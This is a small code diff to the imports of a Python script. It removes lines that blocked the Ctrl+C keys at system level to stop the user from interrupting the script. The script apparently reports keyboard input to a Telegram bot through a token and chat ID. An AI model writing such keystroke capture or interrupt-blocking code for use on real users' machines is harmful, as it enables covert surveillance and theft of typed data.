@@ -1,15 +1,8 @@
 import os, io, time, keyboard, uuid, socket
-
-keyboard.block_key("ctrl") # bypassing KeyboardInterrupt error on import stage by blocking keys on system level
-keyboard.block_key("c")
-
 import asyncio
 from datetime import datetime
 from replace import char_replacements
 from tg_output_bot import bot, TOKEN, CHAT_ID
-
-keyboard.unblock_key("ctrl") # unblocking
-keyboard.unblock_key("c")
 
 # TG MESSAGE:
 
